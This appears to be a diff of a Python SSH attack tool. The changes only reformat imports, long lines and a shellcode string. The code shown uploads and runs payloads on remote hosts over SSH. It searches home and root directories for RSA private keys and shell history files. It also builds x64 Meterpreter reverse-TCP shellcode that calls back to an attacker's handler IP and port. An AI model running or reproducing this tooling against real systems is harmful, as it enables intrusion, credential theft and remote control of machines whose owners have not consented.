@@ -1,16 +1,16 @@
-import base64
-import paramiko
-import SimpleHTTPServer
-import SocketServer
-import thread
-import argparse
-import socket
-from netaddr import IPAddress, IPRange, IPNetwork, AddrFormatError
-import threading
-import time
 import os
+import time
+import base64
+import thread
+import socket
 import random
 import string
+import paramiko
+import argparse
+import threading
+import SocketServer
+import SimpleHTTPServer
+from netaddr import IPAddress, IPRange, IPNetwork, AddrFormatError
 CRED = '\033[91m'
 CEND = '\033[0m'
 CGREEN  = '\33[32m'
@@ -61,7 +61,7 @@ def copy_exec(ip, username, password, identity_file, file, timeout):
         sftp.put('output/' + file, file)
         print CGREEN + "[+] Payload copied to " + str(ip) + "!" + CEND
         print CGREEN + "[!] Attempting to execute payload on " + str(ip) + "..." + CEND
-        stdin, stdout, stderr = client.exec_command(" chmod +x "+ file +"; sleep 1; rm "+ file + " & ./" + file, timeout=timeout)
+        stdin, stdout, stderr = client.exec_command(" chmod +x "+ file +"; sleep 1; rm " + file + " & ./" + file, timeout=timeout)
         try:
             for line in stdout:
                 print line
@@ -73,7 +73,8 @@ def steal(ip, username, password, identity_file, type, timeout):
     client = connect(ip, username, password, identity_file)
     if client:
         if type == "keys":
-            command = "find /home/ /root/ /Users/ -type f -exec awk 'FNR==1 && /RSA PRIVATE KEY/ { print FILENAME  }; FNR>1 {nextfile}' {} + 2>/dev/null "
+            command = "find /home/ /root/ /Users/ -type f -exec awk 'FNR==1 && /RSA PRIVATE KEY/ { print FILENAME  };"
+            command += " FNR>1 {nextfile}' {} + 2>/dev/null "
         if type == "history":
             command = "find /home /root /Users -name .\*_history -type f 2>/dev/null"
         stdin, stdout, stderr = client.exec_command(command, timeout=timeout)
@@ -283,7 +284,16 @@ def parse_targets(target):
 def shellcode_meterpreter_64(port,ip):
     hex_port = make_port(port)
     hex_ip = make_ip(ip)
-    shellcode = '\\x48\\x31\\xff\\x6a\\x09\\x58\\x99\\xb6\\x10\\x48\\x89\\xd6\\x4d\\x31\\xc9\\x6a\\x22\\x41\\x5a\\xb2\\x07\\x0f\\x05\\x48\\x85\\xc0\\x78\\x5b\\x6a\\x0a\\x41\\x59\\x56\\x50\\x6a\\x29\\x58\\x99\\x6a\\x02\\x5f\\x6a\\x01\\x5e\\x0f\\x05\\x48\\x85\\xc0\\x78\\x44\\x48\\x97\\x48\\xb9\\x02\\x00{0}{1}\\x51\\x48\\x89\\xe6\\x6a\\x10\\x5a\\x6a\\x2a\\x58\\x0f\\x05\\x48\\x85\\xc0\\x79\\x1b\\x49\\xff\\xc9\\x74\\x22\\x6a\\x23\\x58\\x6a\\x00\\x6a\\x05\\x48\\x89\\xe7\\x48\\x31\\xf6\\x0f\\x05\\x48\\x85\\xc0\\x79\\xb7\\xeb\\x0c\\x59\\x5e\\x5a\\x0f\\x05\\x48\\x85\\xc0\\x78\\x02\\xff\\xe6\\x6a\\x3c\\x58\\x6a\\x01\\x5f\\x0f\\x05'.format(hex_port, hex_ip)
+    shellcode = '\\x48\\x31\\xff\\x6a\\x09\\x58\\x99\\xb6\\x10\\x48\\x89\\xd6\\x4d'
+    shellcode += '\\x31\\xc9\\x6a\\x22\\x41\\x5a\\xb2\\x07\\x0f\\x05\\x48\\x85\\xc0'
+    shellcode += '\\x78\\x5b\\x6a\\x0a\\x41\\x59\\x56\\x50\\x6a\\x29\\x58\\x99\\x6a'
+    shellcode += '\\x02\\x5f\\x6a\\x01\\x5e\\x0f\\x05\\x48\\x85\\xc0\\x78\\x44\\x48'
+    shellcode += '\\x97\\x48\\xb9\\x02\\x00' + hex_port + hex_ip + '\\x51\\x48\\x89\\xe6\\x6a\\x10\\x5a'
+    shellcode += '\\x6a\\x2a\\x58\\x0f\\x05\\x48\\x85\\xc0\\x79\\x1b\\x49\\xff\\xc9'
+    shellcode += '\\x74\\x22\\x6a\\x23\\x58\\x6a\\x00\\x6a\\x05\\x48\\x89\\xe7\\x48'
+    shellcode += '\\x31\\xf6\\x0f\\x05\\x48\\x85\\xc0\\x79\\xb7\\xeb\\x0c\\x59\\x5e'
+    shellcode += '\\x5a\\x0f\\x05\\x48\\x85\\xc0\\x78\\x02\\xff\\xe6\\x6a\\x3c\\x58'
+    shellcode += '\\x6a\\x01\\x5f\\x0f\\x05'
     return shellcode
 
 
@@ -403,7 +413,8 @@ def main():
             stager_meterpreter_php(m_ip, m_port, targets, 22, args.username, args.password, args.identity_file)
         if type == '64':
             command = invoke_shellcode(shellcode_meterpreter_64(m_port, m_ip))
-            print CGREEN + "Attempting to execute meterpreter shellcode... \nHandler: " + str(m_ip) + ":" + str(m_port) + " \nPayload: linux/x64/meterpreter/reverse_tcp" +  CEND
+            print CGREEN + "Attempting to execute meterpreter shellcode... \nHandler: " + str(m_ip) + ":" + str(m_port)\
+                + " \nPayload: linux/x64/meterpreter/reverse_tcp" + CEND
             start_thread(targets, "execute_command", [22, args.username, args.password, args.identity_file, command, 2])
         if type == 'osx':
             try:
